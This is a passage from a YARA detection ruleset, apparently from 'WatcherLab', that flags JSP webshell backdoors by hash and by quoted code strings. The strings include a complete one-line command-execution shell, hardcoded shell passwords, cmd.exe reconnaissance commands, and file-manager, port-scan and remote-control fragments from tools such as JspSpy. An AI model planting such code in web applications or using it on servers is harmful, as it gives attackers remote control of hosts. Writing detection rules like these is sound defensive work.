        $x1 = "session.setAttribute(\"progErrorByteArrayOutputStream\", processThreadSession.getProgError());" fullword ascii
        $x2 = "session.setAttribute(\"progOutputByteArrayOutputStream\", processThreadSession.getProgOutput());" fullword ascii
        $x3 = "session.setAttribute(\"progInBufferedWriter\", processThreadSession.getProgIn());" fullword ascii
        $x4 = "private void execute(HttpSession session, String cmd) throws IOException {" fullword ascii
        $s5 = "<FORM NAME=\"shell\" action=\"\" method=\"POST\" onsubmit=\"exeCommand('execute');return false;\">" fullword ascii
        $s6 = "<input type=\"button\" value=\"Reset\" name=\"controlcButton\" onclick=\"exeCommand('controlc');return false;\"/>" fullword ascii
        $s7 = "while(processThreadSession.getProgIn()==null && processThreadSession.isAlive()){" fullword ascii
        $s8 = "Thread processThreadSessionOld = (Thread) session.getAttribute(\"process\");" fullword ascii
        $s9 = "private void setupProcess(HttpSession session) {" fullword ascii
        $s10 = "ByteArrayOutputStream progErrorOutput = (ByteArrayOutputStream) session.getAttribute(\"progErrorByteArrayOutputStream\");" fullword ascii
        $s11 = "proc = runtime.exec(\"cmd\");// for Windows System use runtime.exec(\"cmd\");" fullword ascii
        $s12 = "req.setRequestHeader('User-Agent','XMLHTTP/1.0');" fullword ascii
        $s13 = "session.setAttribute(\"process\", processThreadSession);" fullword ascii
        $s14 = "document.shell.output.value = document.shell.output.value + request.responseText;" fullword ascii
        $s15 = "ByteArrayOutputStream progOutput = (ByteArrayOutputStream) session.getAttribute(\"progOutputByteArrayOutputStream\");" fullword ascii
        $s16 = "System.out.println(\"Process end!!!!!!!\");" fullword ascii
        $s17 = "ProcessThread processThreadSession = new ProcessThread();" fullword ascii
        $s18 = "processThreadSessionOld.interrupt();" fullword ascii
        $s19 = "function exeCommand(myFunction){" fullword ascii
        $s20 = "req.setRequestHeader(\"Content-length\", postData.length);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d849bdd27a25abed4c99f23174633f752b42d496
{
    meta:
        description = "jsp - file d849bdd27a25abed4c99f23174633f752b42d496.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5a941c7049d80e6ef7ff9ac7ad9a910bbf7677daba73a6409bc59f62b2e22a89"
    strings:
        $x1 = "</font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>\"};" fullword ascii
        $x2 = "<center><a href=\"http://www.syue.com\" target=\"_blank\">www.SYUE.com</a> ,All Rights Reserved." fullword ascii
        $s3 = "<a href=\"http://bbs.syue.com/\" target=\"_blank\">http://bbs.syue.com/</a></b>" fullword ascii
        $s4 = "<br>Any question, please email me admin@syue.com" fullword ascii
        $s5 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s6 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s7 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s8 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s9 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s10 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s11 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s12 = "<title>JSP Shell " fullword ascii
        $s13 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s14 = "sbEdit.append(htmlEncode(line)+\"\\r\\n\");  " fullword ascii
        $s15 = "private final static int languageNo=0; //" fullword ascii
        $s16 = "))+\"','','\"+strCmd+\"','1','');\\\">\");" fullword ascii
        $s17 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
        $s18 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e51080732e162b927fca9b2a9e7bcbaf446bb4a3
{
    meta:
        description = "jsp - file e51080732e162b927fca9b2a9e7bcbaf446bb4a3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s6 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s8 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s9 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s10 = "private static final String PW = \"shang\"; //password" fullword ascii
        $s11 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s12 = "der(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.c" ascii
        $s13 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s14 = "* CY . I Love You." fullword ascii
        $s15 = "* by n1nty" fullword ascii
        $s16 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s17 = "dData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert" ascii
        $s18 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c8678727a4701d07a11cab2ca898e7207b3240a6
{
    meta:
        description = "jsp - file c8678727a4701d07a11cab2ca898e7207b3240a6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "private static final String PW = \"rjmJsp\"; //password" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s6 = "String tempLine = rd.readLine();" fullword ascii
        $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s8 = "tempLine = rd.readLine();" fullword ascii
        $s9 = "tempStr.append(tempLine);" fullword ascii
        $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s11 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s12 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s13 = "* Code LYK" fullword ascii
        $s14 = "* Rui JiangMei . I Love You." fullword ascii
        $s15 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s16 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; Love  You.</span><a href=\\\"\\\" target=\\\"_blank\\\"></a>RuiJianMei" ascii
        $s17 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s18 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s19 = "while (tempLine != null)" fullword ascii
        $s20 = "HttpURLConnection url_con = null;" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1
{
    meta:
        description = "jsp - file bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "488e17e55f6fd84cb138ad1350b7f3b2c5a8b82faf2e7903789d6d3c848f3883"
    strings:
        $x1 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inp" fullword ascii
        $x2 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inpu" ascii
        $x3 = "out.println(\"<tr><td bgcolor=menu><a href='http://blog.csdn.net/BackerHack' target=FileFrame>About nonamed(BackerHack)</a></" fullword ascii
        $x4 = "out.print(\"<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>\"" fullword ascii
        $x5 = "out.print(\"<td colspan=2>file:<input name=file type=file>up to file<input title='d:\\\\1.txt' name=UPaddress size=35 type=text" fullword ascii
        $x6 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=T target=FileFrame>\"+ico(53)+\"SystemTools</a></td></tr>\");" fullword ascii
        $s7 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>OpenTheHttpProxy</a></td></tr>\");" fullword ascii
        $s8 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>CloseTheHttpProxy</a></td></tr>\");" fullword ascii
        $s9 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=S target=FileFrame>\"+ico(53)+\"SystemInfo(System.class)</a></td></tr>\");" fullword ascii
        $s10 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=L target=FileFrame>\"+ico(53)+\"ServletInfo</a></td></tr>\");" fullword ascii
        $s11 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=i target=FileFrame>\"+ico(57)+\"Interfaces</a></td></tr>\");" fullword ascii
        $s12 = "out.println(\"<tr bgcolor=menu><td><a href=\\\"javascript:top.address.FolderPath.value='\"+folderReplace(f[i].getAbs" fullword ascii
        $s13 = "out.print(Runtime.getRuntime().availableProcessors()+\" <br>\");" fullword ascii
        $s14 = "out.print(\"<tr><form method=post action='?Action=IPscan'><td bordercolorlight=Black bgcolor=menu>Scan Port</td><td>IP:<input" fullword ascii
        $s15 = "out.println(\"<tr><td bgcolor=menu><a href='http://blog.csdn.net/BackerHack' target=FileFrame>About nonamed(BackerHack)</a></td>" ascii
        $s16 = "\"<form name=login method=post>username:<input name=LName type=text size=15><br>\" +" fullword ascii
        $s17 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s18 = "con=DriverManager.getConnection(url,userName,passWord);" fullword ascii
        $s19 = "\"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s20 = "out.print(\"Driver:<input name=driver type=text>URL:<input name=conUrl type=text>user:<input name=user type=text size=3>passw" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s02
{
    meta:
        description = "jsp - file s02.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d5018d83aa3e4972a4078ec06831933c8cb708b14cdb546b7772c392aad1a549"
    strings:
        $s1 = "<% Runtime.getruntime().exec(request.getParameter(\"cmd\")); %>" fullword ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1a4a93233cf5418af85386b5899a634e5c2919b1
{
    meta:
        description = "jsp - file 1a4a93233cf5418af85386b5899a634e5c2919b1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e68119870bc45d5cfda0a196d909288a48dc9ba4182596bfcc61939f79e47e7d"
    strings:
        $s1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s2 = "* Blog http://www.baidu.com/" fullword ascii
        $s3 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s4 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s6 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s7 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s8 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
        $s9 = "private static final String PW = \"max\"; //password" fullword ascii
        $s10 = "idu.com</a></p>\"+" fullword ascii
        $s11 = "* Code By admin" fullword ascii
        $s12 = "* Huan . I Love You." fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule dc2a4efa67ec9670bae07478ca3c0ade3aefb1d3
{
    meta:
        description = "jsp - file dc2a4efa67ec9670bae07478ca3c0ade3aefb1d3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b06e71df669a1904edcf91a35d339812cd1723cfc701d4afc268f2221bd400be"
    strings:
        $s1 = "<meta http-equiv=\"keywords\" content=\"" fullword ascii
        $s2 = "<meta http-equiv=\"description\" content=\"" fullword ascii
        $s3 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url\"><br>" fullword ascii
        $s4 = "<jsp:directive.page import=\"java.io.FileOutputStream\"/>" fullword ascii
        $s5 = "String method=request.getParameter(\"act\");" fullword ascii
        $s6 = "String text=request.getParameter(\"text\");" fullword ascii
        $s7 = "String url=request.getParameter(\"url\");" fullword ascii
        $s8 = "<form action='?act=up'  method='post'>" fullword ascii
        $s9 = "<jsp:directive.page import=\"java.io.OutputStream\"/>" fullword ascii
        $s10 = "<jsp:directive.page import=\"java.io.File\"/>" fullword ascii
        $s11 = "o.write(text.getBytes());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( 8 of them ) ) or ( all of them )
}

rule f4927e1f9af642ef5ad4fb4bcecaad83dcc0de3d
{
    meta:
        description = "jsp - file f4927e1f9af642ef5ad4fb4bcecaad83dcc0de3d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7fff522245c07cf0dc1a00f2650ff37b948337de5d93f58dca8825cea2de0442"
    strings:
        $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_60ccccb207dad4fb29648cb2bf19542d89171851
{
    meta:
        description = "jsp - file 60ccccb207dad4fb29648cb2bf19542d89171851.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
    strings:
        $x1 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
        $s2 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s3 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s4 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s6 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
        $s7 = "cqq1978@Gmail.com" fullword ascii
        $s8 = "<title>JFoler 0.9 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s9 = "private final static int languageNo=0; //" fullword ascii
        $s10 = "- - by " fullword ascii
        $s11 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
        $s12 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ae3e4a01510afef2b72758a070230889f2279cb0
{
    meta:
        description = "jsp - file ae3e4a01510afef2b72758a070230889f2279cb0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3dc6ecb259bfbe4a6433806f5f262e4eedf8c9fac3d0a5e2de0cd89aed857666"
    strings:
        $s1 = "out.println(\"<div align='center'><form action='?act=login' method='post'>\");" fullword ascii
        $s2 = "out.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");" fullword ascii
        $s3 = "out.println(\"<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>\");" fullword ascii
        $s4 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword ascii
        $s5 = "out.println(\"<textarea name='content' rows=15 cols=50></textarea><br>\");" fullword ascii
        $s6 = "out.println(\"<input type='password' name='pass'/>\");" fullword ascii
        $s7 = "String content=request.getParameter(\"content\");" fullword ascii
        $s8 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%>" fullword ascii
        $s9 = "<%!private String password=\"hehe\";//" fullword ascii
        $s10 = "if(request.getSession().getAttribute(\"hehe\")!=null)" fullword ascii
        $s11 = "out.println(\"<form action=\"+url+\" method=post>\");" fullword ascii
        $s12 = "if (path!=null && !path.equals(\"\") && content!=null && !content.equals(\"\"))" fullword ascii
        $s13 = "}if(act.equals(\"login\"))" fullword ascii
        $s14 = "String pass=request.getParameter(\"pass\");" fullword ascii
        $s15 = "out.println(\"<font size=3><br></font><input type=text size=54 name='path'><br>\");" fullword ascii
        $s16 = "String url2=request.getRealPath(request.getServletPath());" fullword ascii
        $s17 = "session.setAttribute(\"hehe\",\"hehe\");" fullword ascii
        $s18 = "if(pass.equals(password))" fullword ascii
        $s19 = "writer.println(content);" fullword ascii
        $s20 = "String path=request.getParameter(\"path\");" fullword ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule f3c627b626dbe602b6a784b83fba1908a5a0f78d
{
    meta:
        description = "jsp - file f3c627b626dbe602b6a784b83fba1908a5a0f78d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b9e52d41fa9d41dfaebad793ef99bda10c1f1c08fca43541b6d83c0e23cabddd"
    strings:
        $s1 = "private static final String PW = \"ninty90\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule a65a0e13d5a1a404366f6bfd92e5dde6e94a6ba6
{
    meta:
        description = "jsp - file a65a0e13d5a1a404366f6bfd92e5dde6e94a6ba6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "20439a4058bb68ba1973e780a51942a19e775f665ea241d8d667afe4f2c49b1a"
    strings:
        $x1 = "\"<span style=\\\"font:17px Verdana;\\\">Copyright &copy; </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">" fullword ascii
        $x2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">By " fullword ascii
        $s3 = "\">&nbsp;&nbsp;<a target=\\\"_blank\\\" href=\\\"http://www.baidu.com/\\\">" fullword ascii
        $s4 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s5 = "out.println(\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(r.getPath())+\"'}).subdir();\\\">" fullword ascii
        $s6 = "V~2013</a></span>\"+request.getHeader(\"host\")+\" (\"+InetAddress.getLocalHost().getHostAddress()+\")</td>\"+" fullword ascii
        $s7 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//??????" fullword ascii
        $s8 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).vEditProperty()\\\">" fullword ascii
        $s9 = "</a> | <a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).move()\\\">" fullword ascii
        $s10 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).vEdit()\\\">" fullword ascii
        $s11 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).move()\\\">" fullword ascii
        $s12 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).copy()\\\">" fullword ascii
        $s13 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).down()\\\">" fullword ascii
        $s14 = "<a href=\\\"javascript:doPost({o:'logout'});\\\">" fullword ascii
        $s15 = "</a> - <a href=\\\"javascript:new fso({}).deleteBatch();\\\">" fullword ascii
        $s16 = "<a href=\\\"javascript:doPost({o:'vRemoteControl'});\\\">" fullword ascii
        $s17 = "<a href=\\\"javascript:doPost({o:'vPortScan'});;\\\">" fullword ascii
        $s18 = "private static final String PW = \"123456aa\"; //password" fullword ascii
        $s19 = "\" | <a href=\\\"javascript:new fso({path:'\"+Util.convertPath(SHELL_DIR)+\"'}).subdir()\\\">JspShell " fullword ascii
        $s20 = "&quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot;</h2>\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c7ec7e8f9270324f17c8fecaebaf10087b4a6c2f
{
    meta:
        description = "jsp - file c7ec7e8f9270324f17c8fecaebaf10087b4a6c2f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0238225b83d37cc1259f83798f35b547a19179eb247beb9087d589bea7832f11"
    strings:
        $x1 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c net start\");  " fullword ascii
        $x2 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c tasklist /svc\");  " fullword ascii
        $x3 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c netstat -an\");  " fullword ascii
        $x4 = "process = Runtime.getRuntime().exec(\"ipconfig /all\");// windows" fullword ascii
        $s5 = "<!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->" fullword ascii
        $s6 = "String exec = exeCmd(out,\"taskkill /f /pid \"+Pid);" fullword ascii
        $s7 = "out.print(\"<a href='?action=Z&command=netstart' target=FileFrame>" fullword ascii
        $s8 = "out.print(\"<a href='?action=Y&command=tasklist' target=FileFrame>" fullword ascii
        $s9 = "out.print(\"<a href='?action=B&command=netstat' target=FileFrame>" fullword ascii
        $s10 = "out.print(\"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + nowURI +\"\\\" />\\n\");" fullword ascii
        $s11 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s12 = "out.print(\"<TR><TD height=20><A href=\\\"?action=q\\\" target=FileFrame>" fullword ascii
        $s13 = "out.print(\"<TR><TD height=20><A href=\\\"?action=G\\\" target=FileFrame>" fullword ascii
        $s14 = "if(request.getParameter(\"pass\")!=null&&request.getParameter(\"pass\").equals(passWord)){" fullword ascii
        $s15 = "out.print(\"<TR><TD height=20><A href='?action=t' target=FileFrame>" fullword ascii
        $s16 = "out.print(\"<CENTER><A href=\\\"\\\" target=_blank><FONT color=red></FONT></CENTER></A>\");" fullword ascii
        $s17 = "</td><td>\"+System.getProperty(\"java.io.tmpdir\")+\"</td></tr>\");" fullword ascii
        $s18 = "res.setHeader(\"Content-disposition\",\"attachment;filename=\\\"\"+fName+\"\\\"\");" fullword ascii
        $s19 = "out.print(\"<A href='\"+\"javascript:JshowFolder(\\\"\"+convertPath(roots[i].getPath())+\"\\\")'>" fullword ascii
        $s20 = "public void pExeCmd(JspWriter out,HttpServletRequest request) throws Exception{" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4a45e4f7ca2bfb1d325d1cff8636d0ece29a4eed
{
    meta:
        description = "jsp - file 4a45e4f7ca2bfb1d325d1cff8636d0ece29a4eed.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "35c44ef39b71532afe1dd00b75297871296cffcfdd146bf38b7d4ac765178241"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ba39f19d1dc058fa4b3e0a500c55e1a2f3e0c706
{
    meta:
        description = "jsp - file ba39f19d1dc058fa4b3e0a500c55e1a2f3e0c706.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "private static final String PW = \"xfg\"; //password" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
